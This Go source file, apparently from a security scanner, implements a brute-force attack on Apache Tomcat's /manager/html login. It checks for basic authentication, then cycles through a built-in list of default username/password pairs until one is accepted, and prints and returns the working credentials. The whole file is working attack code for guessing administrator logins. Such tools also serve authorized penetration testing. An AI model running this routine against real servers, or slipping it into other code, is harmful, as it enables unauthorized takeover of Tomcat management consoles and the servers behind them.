package brute

import "fmt"

func Tomcat_brute(url string) (username string, password string) {
	if req, err := httpRequsetBasic("asdasdascsacacs", "asdasdascsacacs", url+"/manager/html", "HEAD", ""); err == nil {
		if req.StatusCode == 401 {
			for uspa := range tomcatuserpass {
				if req2, err2 := httpRequsetBasic(tomcatuserpass[uspa].username, tomcatuserpass[uspa].password, url+"/manager/html", "HEAD", ""); err2 == nil {
					if req2.StatusCode == 200 || req2.StatusCode == 403 {
						fmt.Printf("tomcat-brute-sucess|%s:%s--%s", tomcatuserpass[uspa].username, tomcatuserpass[uspa].password, url)
						fmt.Println()
						return tomcatuserpass[uspa].username, tomcatuserpass[uspa].password
					}
				}
			}
		}
	}
	return "", ""
}
